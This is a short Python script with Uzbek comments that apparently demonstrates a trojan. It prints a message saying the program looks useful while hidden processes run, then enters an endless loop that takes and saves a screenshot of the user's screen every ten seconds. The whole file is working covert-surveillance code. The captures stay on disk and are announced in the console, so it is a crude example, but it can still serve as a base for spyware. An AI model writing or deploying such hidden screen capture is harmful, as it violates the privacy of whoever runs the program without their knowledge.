import os
import time
import pyautogui

def main_task():
    print("Bu dastur foydali ko'rinadi, lekin yashirin jarayonlar amalga oshirilmoqda.")

def hidden_task():
    """Yashirin vazifa: Har 10 soniyada ekrandan screenshot olish."""
    try:
        while True:
            screenshot = pyautogui.screenshot()
            screenshot_name = f"screenshot_{int(time.time())}.png"
            screenshot.save(screenshot_name)
            print(f"Yashirin screenshot saqlandi: {screenshot_name}")
            time.sleep(10)  # Har 10 soniyada bir marta screenshot olish
    except Exception as e:
        print(f"Xato yuz berdi: {e}")

if __name__ == "__main__":

    main_task()
    
    hidden_task()
